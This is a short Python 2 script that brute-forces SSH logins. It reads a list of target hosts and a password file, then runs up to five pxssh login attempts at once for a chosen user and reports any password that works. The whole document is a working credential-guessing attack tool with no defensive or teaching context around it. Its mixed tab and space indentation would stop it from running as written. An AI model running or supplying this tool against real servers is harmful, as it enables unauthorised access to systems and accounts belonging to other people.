import pxssh
import optparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)

Fails = 0

def connect(host, user, password, release):
    global Fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+] Password Found: ' + password
    except Exception, e:
        if 'read_nonblocking' in str(e):
	    Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
	elif 'synchronize with original prompt' in str(e):
	    time.sleep(1)
	    connect(host, user, password, False)

    finally:
	if release: connection_lock.release()

def main():
    parser = optparse.OptionParser('usage %prog '+\
      '-H <target host> -u <user> -F <password list>'
                              )
    parser.add_option('-H', dest='tgtHost', type='string',\
      help='specify target host')
    parser.add_option('-F', dest='passwdFile', type='string',\
      help='specify password file')
    parser.add_option('-u', dest='user', type='string',\
      help='specify the user')

    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user

    if host == None or passwdFile == None or user == None:
        print parser.usage
        exit(0)
        
    
    hf = open(host, 'r')
    i = 0
    for line in hf.readlines():
      print line.strip('\r').strip('\n')
      i = i + 1 
      print i 
      fn = open(passwdFile, 'r')
      for passLine in fn.readlines():
	  if Fails > 5:
	      print "[!] Exiting: Too Many Socket Timeouts"
	      continue

	  connection_lock.acquire()
	  host = line.strip('\r').strip('\n')
	  password = passLine.strip('\r').strip('\n')
	  print "[-] Testing: "+str(password)
	  t = Thread(target=connect, args=(host, user,\
	    password, True))
	  child = t.start()

if __name__ == '__main__':
    main()

